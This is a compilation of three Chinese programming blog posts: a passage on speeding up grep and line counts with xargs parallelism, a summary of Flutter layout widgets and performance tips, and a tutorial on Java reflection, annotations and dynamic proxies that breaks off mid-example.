上面用-P 0选项指定了尽可能多地开启并发进程数量，如果要保证最高效率，应当设置并发进程数量等于cpu的核心数量(在我的机器上，应该设置为8)，因为在操作时间较久的情况下，可能会并行好几百个进程，这些进程之间进行切换也会消耗不少资源。
然后，用这个脚本去统计测试：
$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps
只花了1.62秒，cpu利用率752%。和前面单进程处理相比，时间是原来的16分之1，cpu利用率是原来的好多好多倍。
再来用grep从这个10G的文本文件中筛选数据，例如筛选包含"10000"字符串的行：
$ /usr/bin/time grep "10000" 9.txt >/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps
24秒，cpu利用率36%。
再次用xargs来处理，以下是脚本：
#!/usr/bin/env bash

find /mnt/d/test -name "fs*" |\
 xargs -P 8 -i grep "10000" {} >/dev/null
测试结果：
$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps
花费时间1.38秒，cpu利用率746%。
这比用什么ag、ack替代grep有效多了。
提升哪些效率以及注意事项
xargs并行处理用的好，能大幅提升效率，但这是有条件的。
首先要知道，xargs是如何提升效率的，以grep命令为例：
ls fs* | xargs -i -P 8 grep 'pattern' {}
之所以xargs能提高效率，是因为xargs可以分批传递管道左边的结果给不同的并发进程，也就是说，xargs要高效，得有多个文件可处理。对于上面的命令来说，ls可能输出了100个文件名，然后1次传递8个文件给8个不同的grep进程。
还有一些注意事项：
1.如果只有单核心cpu，像提高效率，没门
2.xargs的高效来自于处理多个文件，如果你只有一个大文件，那么需要将它切割成多个小片段
3.由于是多进程并行处理不同的文件，所以命令的多行输出结果中，顺序可能会比较随机
例如，统计行数时，每个文件的出现顺序是不受控制的。
10000000 /mnt/d/test/fs_002
9999999 /mnt/d/test/fs_001
10000000 /mnt/d/test/fs_000
10000000 /mnt/d/test/fs_004
9999999 /mnt/d/test/fs_005
9999999 /mnt/d/test/fs_003
10000000 /mnt/d/test/fs_006
9999999 /mnt/d/test/fs_007
不过大多数时候这都不是问题，将结果排序一下就行了。
4.xargs提升效率的本质是cpu的利用率，因此会有内存、磁盘速度的瓶颈。如果内存小，或者磁盘速度慢(将因为加载数据到内存而长时间处于io等待的睡眠状态)，xargs的并行处理基本无效。
例如，将上面10G的文本文件放在虚拟机上，机械硬盘，内存2G，将会发现使用xargs并行和普通的命令处理几乎没有差别，因为绝大多数时间都花在了加载文件到内存的io等待上。
下一篇文章将介绍GNU parallel并行处理工具，它的功能更丰富，效果更强大。

********************************************************************************************************************************************************************************************************
Flutter 布局控件完结篇

本文对Flutter的29种布局控件进行了总结分类，讲解一些布局上的优化策略，以及面对具体的布局时，如何去选择控件。

1. 系列文章

Flutter 布局详解
Flutter 布局（一）- Container详解
Flutter 布局（二）- Padding、Align、Center详解
Flutter 布局（三）- FittedBox、AspectRatio、ConstrainedBox详解
Flutter 布局（四）- Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth详解
Flutter 布局（五）- LimitedBox、Offstage、OverflowBox、SizedBox详解
Flutter 布局（六）- SizedOverflowBox、Transform、CustomSingleChildLayout详解
Flutter 布局（七）- Row、Column详解
Flutter 布局（八）- Stack、IndexedStack、GridView详解
Flutter 布局（九）- Flow、Table、Wrap详解
Flutter 布局（十）- ListBody、ListView、CustomMultiChildLayout详解

1.1 乱侃
前前后后也算是拖拖拉拉的写了一些Flutter的文章，写的也都比较粗略。最近工作调动，内部换了部门，一顿瞎忙活，也打乱了原本的分享计划。
从我最开始接触Flutter到现在，差不多四个多月了。在这段时间里面，Flutter也发布了Release Preview版本。各个技术网站本着先拨头筹的心态，推广了几波，国内的人气跟着也起来了不少。全世界Flutter开发人员中，国内从业者占据了很大的比重，这个现象本身并不能说明什么，不过可以反映一点，有商业诉求吧。当然观望的还是占绝大部分，除了一些个人开发者爱折腾外，也就是一些大的业务成熟到不能再成熟的团队，内部消化人员去折腾这个了。
插个题外话，有感于最近的工作变动，这段时间胡思乱想的比较多。一门技术对程序员来说到底意味着什么？如果不需要再为生计奔波，是否还会对目前已上手的技术感兴趣？如果你现在的项目所需要的技术，对你个人而言毫无加成，只会浪费你的时间，让你在已有的技术栈上渐行渐远，你是否还会参与这个项目。只有极少数人会遇上逆天改命的项目，不管参与什么项目，技术人员的立身之本始终是技术（高管或者打算换行的除外），技术的选型，除去时间效率后续维护等普适性的考虑要素外，排在第一位的始终应该是对自身的提高，扯的有些远了哈。
1.2 本质
我数了一下我文章总结过的布局控件，总共有29种。乍看会觉得真鸡毛的多，不乍看，也会觉得鸡毛的真多。为什么其他的移动平台没有这么多布局控件呢？其实不然，其他平台没有这么细分。
以Android平台为例，最基础的几种布局例如LinearLayout、RelativeLayout、ConstraintLayout等等。很多Flutter的控件，对于Android来说，仅仅是一个属性的设置问题。
再往上看，iOS、Android、Web这些平台的布局，其实最基本就那几种，线性布局、绝对布局、相对布局等等。Flutter也逃不出这些，那为什么Flutter现在有这么多布局控件呢？

第一点，之前文章介绍过的，Flutter的理念是万物皆为widget。这和Flutter的实现机制有关，而不是因为它在布局上有什么特殊性，这也是最主要的一点。
第二点，我觉得是因为这是Flutter的初期，如果有经历过一个技术的完整发展周期，就会明白，前期只是提供各种零件，只有商业支撑或者人员支撑足够的时候，才会去优化零件。而现在就是这么一种资源不足的状态。各种组件可以合并的有很多，底层的实现机制不会变，只是再加一层即可，这也是可以造轮子的地方，例如封装一套适用于Android、iOS或者Web人员的控件库等。
第三点，跟初期相关，一套新的技术，各种东西不可能一下子全想明白，路总是走着走着才发现走歪了，就像一些控件，可能一些地方合适，但是一些新的地方又不太合适，所以就再造一个，所以有些控件看起来功能十分相似。

说了这么多，我其实就想说明一点，Flutter现在还只是处在社会发展的初级阶段，还处在温饱问题都解决不了的状态，想达到小康还需要很长的一段路要走。
2. 单节点控件
单节点控件，顾名思义就是只有一个节点的布局控件。这种控件有多少个呢，我之前文章总结过的有18种，现阶段还是不排除增加的可能，哈哈。
2.1 分类
在这小节里，我尝试从多个维度去对这些控件进行分类，希望这样可以帮助大家理解。
2.1.1 按照继承划分

上面是这18种控件的父节点层面的继承关系，唯一不同的一个控件就是Container。所以按照是否继承自SingleChildRenderObjectWidget的分类如下：

继承自StatelessWidget的控件，有Container。
继承自SingleChildRenderObjectWidget的控件，有Padding、Align、Center、FittedBox、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、SizedOverflowBox、Transform、CustomSingleChildLayout。

Container是一个组合控件，不是一个基础控件，这点从继承关系就可以看出来。
2.1.2 按照功能是否单一划分
分类如下：

功能不单一的控件，Container、Transform、FittedBox、SizedOverflowBox。
功能单一的控件，有Padding、Align、Center、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、CustomSingleChildLayout。

先在此处小结一下，可以看出Container的特殊之处了吧，为什么Container这么特殊了。这个特殊要从两个层面去看。

对于Flutter而言，Container是特殊的，因为它不是功能单一的控件，是一个组合的控件，所以它相对于Flutter是特殊的。
对于移动端开发者而言，它不是特殊的，因为很多UI都是一些基础功能组合的，这样能让开发者更方便的使用。

那能得出什么结论呢？我个人觉得，Container这种组合的控件会越来越多，也会有个人开发者去开发这种通用型的组合控件，这是一个大趋势，是Flutter走向易用的一小步。
2.1.3 按照功能划分
在此处我按照定位、尺寸、绘制三部分来尝试着去做功能的划分，当然这个划分并不绝对，仁者见仁吧。

定位控件：Container、Align、Center、FittedBox、Baseline、Transform。
尺寸控件：Container、FittedBox、AspectRatio、ConstrainedBox、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、SizedBox、SizedOverflowBox。
绘制控件：Container、Padding、Offstage、OverflowBox、SizedOverflowBox、Transform。

有一个控件并没有归到这三类中，CustomSingleChildLayout可以自定义实现，此处不做分类。Baseline可以把它放到绘制里面去，此处我按照调节文字的位置去做分类，这个大家知道就行，并不是说只能这么划分。
对于绘制控件，其实分的有些杂，我把显示相关的都归到这里，例如是否显示、内边距、是否超出显示以及变形等等。
每一种大类，Flutter都提供了多种控件。经过这么划分，可以看出很多控件功能的交叉，很多时候一个属性的事情，Flutter还是分出了一个控件。

2.2 使用
单节点控件虽然这么多，但是大部分不会挨个去尝试。对于大部分人而言，都是佛系的用法，一个控件能够使用，就一直用到死。
在布局上，大方向还是不停的拆，把一张设计图，拆成一棵树，每个节点根据需要，选择合适的控件，然后从根部开始不停嵌套，布局就完成了。
2.3 控件的选择
控件种类繁多，真正使用的时候该如何去选择呢？有万金油的做法，不管啥都用Container，这也是很多初接触的人经常干的方式。这么做的确可以按照设计图把布局给实现了，但是会涉及到一些性能上的问题。
控件的选择，按照控件最小功能的标准去选择。例如需要将子节点居中，可以使用Container设置alignment的方式，也可以使用Center。但是从功能上，Center是最小级别的，因此选择它的话，额外的开销会最小。
将UI实现了，这只是最基本的，当达到这一步了，应该更多的去思考，如何更好的布局，使得性能更高。
3. 多节点控件
多节点控件的种类就少了一些，虽然也有11种，但是功能和场景多了，所以选择上反而会简单一些。
3.1 分类
多节点控件内部实现比单节点控件复杂的多，会从继承以及功能两个方向去做分类。
3.1.1 按照继承划分

从上图可以看出，多节点布局控件基本上可以分为三条线

继承自BoxScrollView的控件，有GridView以及ListView；
继承自MultiChildRenderObjectWidget的控件，有Row、Column、Flow、Wrap、Stack、IndexedStack、ListBody、CustomMultiChildLayout八种；
继承自RenderObjectWidget的控件，有Table一种。

之前介绍过，GridView和ListView的实现都是非常相似的，基本上就是silvers只包含一个Sliver（GridView为SilverGrid、ListVIew为SliverList）的CustomScrollView。 这也是为啥这两元素都继承自BoxScrollView的缘故。
MultiChildRenderObjectWidget类，官方解读如下

A superclass for RenderObjectWidgets that configure RenderObject subclasses
that have a single list of children.

它只是一个含有单一list子节点的控件，为什么Table不需要继承自MultiChildRenderObjectWidget呢？
这是因为Table的子节点是二维（横竖）的，而MultiChildRenderObjectWidget提供的是一个一维的子节点管理，所以必须继承自RenderObjectWidget。知道了这些过后，对继承关系的理解会有更好的帮助。
3.1.2 按照功能划分
这个对于多节点布局控件来说，还是比较难以划分的，笔者试着做了如下划分：

列表：GridView、ListView；
单列单行或者多列多行：Row、Column、Flow、Wrap、ListBody、Table；
显示位置相关：Stack、IndexedStack、CustomMultiChildLayout。

个人觉得这种分类方式不是特别的稳妥，但还是写下来了，请大家仁者见仁。
GridView和ListView分为一类，一个是因为其实现非常的相似，另一个原因是这两个控件内容区域可以无限，不像其他控件的内容区域都是固定的，因此将这两个划分为一类。
关于单列单行多列多行的，也并不是说很严格的，Row、Column、Table、ListBody可能会遵守这种划分，Flow以及Wrap则是近似的多列多行。这种划分绝对不是绝对的，只是个人的一种考量划分方式。
3.2 使用
多节点控件种类较少，而且功能重叠的很少，因此在使用上来说，还是简单一些。比较常用的GridView、ListView、Row、Column、Stack，这几个控件基本上涵盖了大部分的布局了。
3.3 控件的选择
多节点控件功能重叠的较少，因此选择上，不会存在太多模凌两可的问题，需要什么使用什么即可。
4. 性能优化
性能优化这块儿，可能仁者见仁，并没有一个统一的说法，毕竟现在Flutter各方面都还不完善。但是，大方向还是有的，尽量使用功能集更小的控件，这个对于渲染效率上还是有所帮助的。
4.1 优化
在这里我试着去列举一些，并不一定都正确。

对于单节点控件，如果一个布局多个控件都可以完成，则使用功能最小的，可以参照上面控件分类中的功能划分来做取舍；
对于多节点控件，如果单节点控件满足需求的话，则去使用单节点控件进行布局；
对于ListView，标准构造函数适用于条目比较少的情况，如果条目较多的话，尽量使用ListView.builder；
对于GridView，如果需要展示大量的数据的话，尽量使用GridView.builder；
Flow、Wrap、Row、Column四个控件，单纯论效率的话，Flow是最高效的，但是使用起来是最复杂的；
如果是单行或者单列的话，Row、Column比Table更高效；
Stack和CustomMultiChildLayout如果同时满足需求的话，CustomMultiChildLayout在某些时候效率会更高一些，但是取决于Delegate的实现，且使用起来更加的复杂；

上面所列的比较杂，但是归纳起来，无非这几点：

功能越少的控件，效率越高；
ListView以及GridView的builder构造函数效率更高；
实现起来比较复杂的控件，效率一般会更高。

4.2 选择
控件的选择，个人觉得把握大方向就够了。如果时间紧急，以实现效率最优先，如果时间充裕的话，可以按照一些优化细则，去做一些选择。单纯控件层面，带来性能上的改进毕竟十分有限。
5. 实战
首先看一下实际的效果图，这个是之前做工程中，比较复杂的一个界面吧，就算放到native上看，也是比较复杂的。

这个页面中有不少自定义控件，例如日期选择、进度等。整体看着复杂，实现起来其实也还好。关于如何布局拆解，之前文章有过介绍，在这里不再阐述，诀窍就是一个字----拆。
5.1 关于自定义控件
自定义控件一般都是继承自StatelessWidget、StatefulWidget。也有一些特殊的，例如上面的进度控件，直接使用Canvas画的。
对于需要更新状态的，一般都是继承自StatefulWidget，对于不需要更新状态的，使用StatelessWidget即可，能够使用StatelessWidget的时候，也尽量使用它，StatefulWidget在页面更新的时候，会存在额外的开销。
Flutter的自定义控件，写起来可能会比原生的更简单，它更多的是一些基础控件的组合使用，而很少涉及到底层的一些重写。
5.2 关于生命周期
这是很蛋疼的一个问题，一个纯Flutter的App，类似于Android中的单Activity应用。某个具体的页面就算去监听native层的生命周期，也仅仅是获取到base activity的，而无法获取到页面层级的。
5.3 感想
Flutter如果轮子足够的话，还是非常吸引人的，在熟悉了这些基础组件过后，编写起来，速度会非常快。自定义控件的实现，也比较简单。但是，性能方面，还是存在比较大的问题，复杂页面首次载入，速度还是比较慢。对于高端机型来说，整体流畅度很不错，堪比原生的app，低端机型，表现就比较捉急吧。整体来说，Flutter表现还是挺不错的，可以上手试试，把玩把玩吧。就是写起来，写着写着就觉得恶心，是真的恶心的那种恶心，看着各种嵌套标签，感觉被降维成了web开发。
近期看到一些基于Flutter的自动布局解决方案，之前也有想过，完全可以基于Flutter做出布局的工具，仅仅是拖拽就可以实现完成度非常高的布局页面。也得益于Flutter本身的思想和实现机制，web方面的很多东西，个人觉得都可以借鉴到Flutter上。单纯从UI层来说，Flutter确实有自己独特的地方。如果Flutter在最开始，就仅仅是一套跨平台的UI的话，可能更容易被人们接受吧。
前几天看了官方的camera插件，还是挺蛋疼的，对于国内的Android端来说，直接拿来商用几乎是不可能的。插件基于camera2去实现，国内大部分厂商对于camera2的支持很差，一些很容易复现的crash也没有去解决。
如果决定在现有项目中使用Flutter，则需要做好埋坑造轮子的觉悟。如果人力紧缺的话，不应该在这上面去投入，人力富余的时候，可以投入人力跟进研究，让业界觉得你们很棒很前沿。
6. 后话
笔者建了一个Flutter学习相关的项目，Github地址，里面包含了笔者写的关于Flutter学习相关的一些文章，会定期更新，也会上传一些学习Demo，欢迎大家关注。
7. 参考

Flutter 布局详解


********************************************************************************************************************************************************************************************************
反射、注解和动态代理
反射是指计算机程序在运行时访问、检测和修改它本身状态或行为的一种能力，是一种元编程语言特性，有很多语言都提供了对反射机制的支持，它使程序能够编写程序。Java的反射机制使得Java能够动态的获取类的信息和调用对象的方法。
一、Java反射机制及基本用法
在Java中，Class（类类型）是反射编程的起点，代表运行时类型信息（RTTI，Run-Time Type Identification）。java.lang.reflect包含了Java支持反射的主要组件，如Constructor、Method和Field等，分别表示类的构造器、方法和域，它们的关系如下图所示。

Constructor和Method与Field的区别在于前者继承自抽象类Executable，是可以在运行时动态调用的，而Field仅仅具备可访问的特性，且默认为不可访问。下面了解下它们的基本用法：


获取Class对象有三种方式，Class.forName适合于已知类的全路径名，典型应用如加载JDBC驱动。对同一个类，不同方式获得的Class对象是相同的。

// 1. 采用Class.forName获取类的Class对象
Class clazz0 = Class.forName("com.yhthu.java.ClassTest");
System.out.println("clazz0:" + clazz0);
// 2. 采用.class方法获取类的Class对象
Class clazz1 = ClassTest.class;
System.out.println("clazz1:" + clazz1);
// 3. 采用getClass方法获取类的Class对象
ClassTest classTest = new ClassTest();
Class clazz2 = classTest.getClass();
System.out.println("clazz2:" + clazz2);
// 4. 判断Class对象是否相同
System.out.println("Class对象是否相同:" + ((clazz0.equals(clazz1)) && (clazz1.equals(clazz2))));

注意：三种方式获取的Class对象相同的前提是使用了相同的类加载器，比如上述代码中默认采用应用程序类加载器（sun.misc.Launcher$AppClassLoader）。不同类加载器加载的同一个类，也会获取不同的Class对象：

// 自定义类加载器
ClassLoader myLoader = new ClassLoader() {
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        try {
            String fileName = name.substring(name.lastIndexOf(".") + 1) + ".class";
            InputStream is = getClass().getResourceAsStream(fileName);
            if (is == null) {
                return super.loadClass(name);
            }
            byte[] b = new byte[is.available()];
            is.read(b);
            return defineClass(name, b, 0, b.length);
        } catch (IOException e) {
            throw new ClassNotFoundException(name);
        }
    }
};
// 采用自定义类加载器加载
Class clazz3 = Class.forName("com.yhthu.java.ClassTest", true, myLoader);
// clazz0与clazz3并不相同
System.out.println("Class对象是否相同:" + clazz0.equals(clazz3));

通过Class的getDeclaredXxxx和getXxx方法获取构造器、方法和域对象，两者的区别在于前者返回的是当前Class对象申明的构造器、方法和域，包含修饰符为private的；后者只返回修饰符为public的构造器、方法和域，但包含从基类中继承的。

// 返回申明为public的方法，包含从基类中继承的
for (Method method: String.class.getMethods()) {
    System.out.println(method.getName());
}
// 返回当前类申明的所有方法，包含private的
for (Method method: String.class.getDeclaredMethods()) {
    System.out.println(method.getName());
}

通过Class的newInstance方法和Constructor的newInstance方法方法均可新建类型为Class的对象，通过Method的invoke方法可以在运行时动态调用该方法，通过Field的set方法可以在运行时动态改变域的值，但需要首先设置其为可访问（setAccessible）。

二、 注解
注解（Annontation）是Java5引入的一种代码辅助工具，它的核心作用是对类、方法、变量、参数和包进行标注，通过反射来访问这些标注信息，以此在运行时改变所注解对象的行为。Java中的注解由内置注解和元注解组成。内置注解主要包括：

@Override - 检查该方法是否是重载方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。
@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。
@SuppressWarnings - 指示编译器去忽略注解中声明的警告。
@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。
@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。

这里，我们重点关注元注解，元注解位于java.lang.annotation包中，主要用于自定义注解。元注解包括：

@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问，枚举类型分为别SOURCE、CLASS和RUNTIME；
@Documented - 标记这些注解是否包含在用户文档中。
@Target - 标记这个注解应该是哪种Java 成员，枚举类型包括TYPE、FIELD、METHOD、CONSTRUCTOR等；
@Inherited - 标记这个注解可以继承超类注解，即子类Class对象可使用getAnnotations()方法获取父类被@Inherited修饰的注解，这个注解只能用来申明类。
@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。

自定义元注解需重点关注两点：1）注解的数据类型；2）反射获取注解的方法。首先，注解中的方法并不支持所有的数据类型，仅支持八种基本数据类型、String、Class、enum、Annotation和它们的数组。比如以下代码会产生编译时错误：
@Documented
@Inherited
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
public @interface AnnotationTest {
    // 1. 注解数据类型不能是Object；2. 默认值不能为null
    Object value() default null;
    // 支持的定义方式
    String value() default "";
}
其次，上节中提到的反射相关类（Class、Constructor、Method和Field）和Package均实现了AnnotatedElement接口，该接口定义了访问反射信息的方法，主要如下：
// 获取指定注解类型
getAnnotation(Class<T>):T;
// 获取所有注解，包括从父类继承的
getAnnotations():Annotation[];
// 获取指定注解类型，不包括从父类继承的
getDeclaredAnnotation(Class<T>):T
// 获取所有注解，不包括从父类继承的
getDeclaredAnnotations():Annotation[];
// 判断是否存在指定注解
isAnnotationPresent(Class<? extends Annotation>:boolean
当使用上例中的AnnotationTest 标注某个类后，便可在运行时通过该类的反射方法访问注解信息了。
@AnnotationTest("yhthu")
public class AnnotationReflection {

    public static void main(String[] args) {
        AnnotationReflection ar = new AnnotationReflection();
        Class clazz = ar.getClass();
        // 判断是否存在指定注解
        if (clazz.isAnnotationPresent(AnnotationTest.class)) {
            // 获取指定注解类型
            Annotation annotation = clazz.getAnnotation(AnnotationTest.class);
            // 获取该注解的值
            System.out.println(((AnnotationTest) annotation).value());
        }
    }
}

当自定义注解只有一个方法value()时，使用注解可只写值，例如：@AnnotationTest("yhthu")

三、动态代理
代理是一种结构型设计模式，当无法或不想直接访问某个对象，或者访问某个对象比较复杂的时候，可以通过一个代理对象来间接访问，代理对象向客户端提供和真实对象同样的接口功能。经典设计模式中，代理模式有四种角色：

Subject抽象主题类——申明代理对象和真实对象共同的接口方法；
RealSubject真实主题类——实现了Subject接口，真实执行业务逻辑的地方；
ProxySubject代理类——实现了Subject接口，持有对RealSubject的引用，在实现的接口方法中调用RealSubject中相应的方法执行；
Cliect客户端类——使用代理对象的类。


在实现上，代理模式分为静态代理和动态代理，静态代理的代理类二进制文件是在编译时生成的，而动态代理的代理类二进制文件是在运行时生成并加载到虚拟机环境的。JDK提供了对动态代理接口的支持，开源的动态代理库（Cglib、Javassist和Byte Buddy）提供了对接口和类的代理支持，本节将简单比较JDK和Cglib实现动态代理的异同，后续章节会对Java字节码编程做详细分析。
3.1 JDK动态代理接口
JDK实现动态代理是通过Proxy类的newProxyInstance方法实现的，该方法的三个入参分别表示：
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h)

ClassLoader loader，定义代理生成的类的加载器，可以自定义类加载器，也可以复用当前Class的类加载器；
Class<?>[] interfaces，定义代理对象需要实现的接口；
InvocationHandler h，定义代理对象调用方法的处理，其invoke方法中的Object proxy表示生成的代理对象，Method表示代理方法， Object[]表示方法的参数。

通常的使用方法如下：
private Object getProxy() {
    return Proxy.newProxyInstance(JDKProxyTest.class.getClassLoader(), new Class<?>[]{Subject.class},
            new MyInvocationHandler(new RealSubject()));
}

private static class MyInvocationHandler implements InvocationHandler {
    private Object realSubject;

    public MyInvocationHandler(Object realSubject) {
        this.realSubject = realSubject;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("Some thing before method invoke");
        Object result = method.invoke(realSubject, args);
        System.out.println("Some thing after method invoke");
        return result;
    }
}
类加载器采用当前类的加载器，默认为应用程序类加载器（sun.misc.Launcher$AppClassLoader）；接口数组以Subject.class为例，调用方法处理类MyInvocationHandler实现InvocationHandler接口，并在构造器中传入Subject的真正的业务功能服务类RealSubject，在执行invoke方法时，可以在实际方法调用前后织入自定义的处理逻辑，这也就是AOP（面向切面编程）的原理。
关于JDK动态代理，有两个问题需要清楚：

Proxy.newProxyInstance的代理类是如何生成的？Proxy.newProxyInstance生成代理类的核心分成两步：

// 1. 获取代理类的Class对象
Class<?> cl = getProxyClass0(loader, intfs);
// 2. 利用Class获取Constructor，通过反射生成对象
cons.newInstance(new Object[]{h});
与反射获取Class对象时搜索classpath路径的.class文件不同的是，这里的Class对象完全是“无中生有”的。getProxyClass0根据类加载器和接口集合返回了Class对象，这里采用了缓存的处理。
// 缓存(key, sub-key) -> value，其中key为类加载器，sub-key为代理的接口，value为Class对象
private static final WeakCache<ClassLoader, Class<?>[], Class<?>>
    proxyClassCache = new WeakCache<>(new KeyFactory(), new ProxyClassFactory());
// 如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成
private static Class<?> getProxyClass0(ClassLoader loader, Class<?>... interfaces) {
    if (interfaces.length > 65535) {
        throw new IllegalArgumentException("interface limit exceeded");
    }
    return proxyClassCache.get(loader, interfaces);
}
如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成。ProxyClassFactory又是通过下面的代码生成Class对象的。
// 生成代理类字节码文件
byte[] proxyClassFile = ProxyGenerator.generateProxyClass(proxyName, interfaces, accessFlags);
try {
    // defineClass0为native方法，生成Class对象
    return defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);
} catch (ClassFormatError e) {
    throw new IllegalArgumentException(e.toString());
}
generateProxyClass方法是用来生成字节码文件的，根据生成的字节码文件，再在native层生成Class对象。

InvocationHandler的invoke方法是怎样调用的？
回答这个问题得先看下上面生成的Class对象究竟是什么样的，将ProxyGenerator生成的字节码保存成文件，然后反编译打开（IDEA直接打开），可见生成的Proxy.class主要包含equals、toString、hashCode和代理接口的request方法实现。

public final class $Proxy extends Proxy implements Subject {
    // m1 = Object的equals方法
    private static Method m1;
    // m2 = Object的toString方法
    private static Method m2;
    // Subject的request方法
    private static Method m3;
    // Object的hashCode方法
    private static Method m0;
 
    // 省略m1/m2/m0，此处只列出request方法实现
    public final void request() throws  {
        try {
            super.h.invoke(this, m3, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }   
}
由于生成的代理类继承自Proxy，super.h即是Prxoy的InvocationHandler，即代理类的request方法直接调用了InvocationHandler的实现，这就回答了InvocationHandler的invoke方法是如何被调用的了。
3.2 Cglib动态代理接口和类
Cglib的动态代理是通过Enhancer类实现的，其create方法生成动态代理的对象，有五个重载方法：
create():Object
create(Class, Callback):Object
create(Class, Class[], Callback):Object
create(Class, Class[], CallbackFilter, Callback):Object
create(Class[], Object):Object
常用的是第二个和第三个方法，分别用于动态代理类和动态代理接口，其使用方法如下：
private Object getProxy() {
    // 1. 动态代理类
    return Enhancer.create(RealSubject.class, new MyMethodInterceptor());
    // 2. 动态代理接口
    return Enhancer.create(Object.class, new Class<?>[]{Subject.class}, new MyMethodInterceptor());
}

private static class MyMethodInterceptor implements MethodInterceptor {

    @Override
    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {
        System.out.println("Some thing before method invoke");
        Object result = proxy.invokeSuper(obj, args);
        System.out.println("Some thing after method invoke");
        return result;
    }
}
从上小节可知，JDK只能代理接口，代理生成的类实现了接口的方法；而Cglib是通过继承被代理的类、重写其方法来实现的，如：create方法入参的第一个参数就是被代理类的类型。当然，Cglib也能代理接口，比如getProxy()方法中的第二种方式。
四、案例：Android端dubbo:reference化的网络访问
Dubbo是一款高性能的Java RPC框架，是服务治理的重量级中间件。Dubbo采用dubbo:service描述服务提供者，dubbo:reference描述服务消费者，其共同必填属性为interface，即Java接口。Dubbo正是采用接口来作为服务提供者和消费者之间的“共同语言”的。
在移动网络中，Android作为服务消费者，一般通过HTTP网关调用后端服务。在国内的大型互联网公司中，Java后端大多采用了Dubbo及其变种作为服务治理、服务水平扩展的解决方案。因此，HTTP网关通常需要Android的网络请求中提供调用的服务名称、服务方法、服务版本、服务分组等信息，然后通过这些信息反射调用Java后端提供的RPC服务，实现从HTTP协议到RPC协议的转换。

关于Android访问网关请求，其分层结构可参考《基于Retrofit+RxJava的Android分层网络请求框架》。

那么，Android端能否以dubbo:reference化的方式申明需要访问的网络服务呢？如何这样，将极大提高Android开发人员和Java后端开发之间的沟通效率，以及Android端的代码效率。
首先，自定义服务的消费者注解Reference，通过该注解标记某个服务。
@Inherited
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Reference {
    // 服务接口名
    String service() default "";
    // 服务版本
    String version() default "";
    // 服务分组
    String group() default "";
    // 省略字段
}
其次，通过接口定义某个服务消费（如果可以直接引入后端接口，此步骤可省略），在注解中指明该服务对应的后端服务接口名、服务版本、服务分组等信息；
@Reference(service = "com.yhthu.java.ClassTestService",  group = "yhthu",  version = "v_test_0.1")
public interface ClassTestService {
    // 实例方法
    Response echo(String pin);
}
这样就完成了服务的申明，接下来的问题是如何实现服务的调用呢？上述申明的服务接口如何定义实现呢？这里就涉及依赖注入和动态代理。我们先定义一个标记注解@Service，标识需要被注入实现的服务申明。
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Service {
}
// 在需要使用服务的地方（比如Activity中）申明需要调用的服务
@Service
private ClassTestService classTestService;
在调用classTestService的方法之前，需要注入该接口服务的实现，因此，该操作可以在调用组件初始化的时候进行。
// 接口与对应实现的缓存
private Map<Class<?>, Object> serviceContainer = new HashMap<>();
// 依赖注入
public void inject(Object obj) {
    // 1. 扫描该类中所有添加@Service注解的域
    Field[] fields = obj.getClass().getDeclaredFields();
    for (Field field : fields) {
        if (field.isAnnotationPresent(Service.class)) {
            Class<?> clazz = field.getType();
            if (clazz.getAnnotation(Reference.class) == null) {
                Log.e("ClassTestService", "接口地址未配置");
                continue;
            }
            // 2. 从缓存中取出或生成接口类的实现（动态代理）
            Object impl = serviceContainer.get(clazz);
            if (impl == null) {
                impl = create(clazz);
                serviceContainer.put(clazz, impl);
            }
            // 3. 设置服务接口实现
            try {
                field.setAccessible(true);
                field.set(obj, impl);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }
}
inject方法的关键有三步：

扫描该类中所有添加@Service注解的字段，即可得到上述代码示例中的ClassTestService字段；
从缓存中取出或生成接口类的实现。由于通过接口定义了服务，并且实现不同服务的实现方式基本一致（即将服务信息发送HTTP网关），在生成实现上可选择JDK的动态代理。
设置服务接口实现，完成为接口注入实现。

private <T> T create(final Class<T> service) {
    return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class<?>[]{service}, new InvocationHandler() {
        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            // 1. 获取服务信息
            Annotation reference = service.getAnnotation(Reference.class);
            String serviceName = ((Reference) reference).service();
            String versionName = ((Reference) reference).version();
            String groupName = ((Reference) reference).group();
            // 2. 获取方法名
